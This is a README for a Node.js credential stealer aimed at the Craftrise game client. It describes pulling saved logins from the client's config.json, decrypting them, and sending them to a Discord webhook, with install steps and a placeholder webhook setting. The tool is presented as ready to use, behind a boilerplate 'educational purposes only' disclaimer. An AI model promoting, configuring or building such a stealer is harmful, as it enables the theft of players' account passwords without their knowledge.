# Craftrise Stealer

Node.js tool for extracting and decrypting user credentials from Craftrise client configuration files.

## Installation
**Download Node.js**: https://nodejs.org/en/download (14.x or higher required)
1. Download the project and extract
2. Install dependencies:
```bash
npm install
```
3. Configure Discord webhook in `main.js`:
```javascript
const WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
```

## Usage
```bash
npm start
```

### Available Scripts
- `npm start` - Run the application

## Features
- Automatic credential extraction from Craftrise config.json
- AES-128-ECB decryption with custom algorithm
- Base64 decoding with prefix/suffix validation
- Discord webhook integration
- Direct file-based password extraction

## Requirements
- Windows x64
- Node.js 14.x or higher
- Craftrise client installed

## Webhook Preview
![Webhook Preview](images/image.PNG)

## Status
Project completed. No active development unless special requests or updates needed.

## License
Apache 2.0 License - See [LICENSE](LICENSE) file for details.

## Disclaimer
This tool is for educational and research purposes only. The author is not responsible for any misuse or damage caused by this software. Use at your own risk and only on systems you own or have explicit permission to test. Any illegal use of this tool is strictly prohibited.

---
⚡ **Craftrise Stealer** - Developed by Fatih1963

